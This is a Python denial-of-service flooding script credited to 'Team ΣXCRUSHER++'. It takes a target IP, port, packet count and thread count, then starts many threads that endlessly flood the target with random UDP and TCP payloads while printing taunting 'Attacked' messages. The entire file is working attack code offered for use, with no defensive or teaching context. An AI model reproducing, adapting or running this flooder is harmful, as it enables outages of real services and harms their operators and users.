import random
import socket
import threading
import os,sys
os.system("clear")
print("Tools By Team ΣXCRUSHER++")
print("ΣXCRUSHER++")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("Do you want to attack?(y/n):"))
times = int(input("PACKET:"))
threads = int(input("THREADS:"))
os.system("clear")
def run():
    data = random._urandom(20000)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            print("Yahaha Kok Down!!")
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")
            
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")

def run4():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")
            
def run5():
    data = random._urandom(20000)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            print("Yahaha Kok Down!!")
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")
            
def run7():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")

def run8():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")
            
def run9():
    data = random._urandom(20000)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attacked Ip %s Dan Port : %s"%(ip, port))
        except:
            print("Yahaha Kok Down!!")
            
def run10():
    data = random._urandom(1050)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")
            
def run11():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")

def run12():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")
            
def run13():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")

def run14():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("Yahaha Kok Down!!")
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
else:
        th = threading.Thread(target = run14)
        th.start()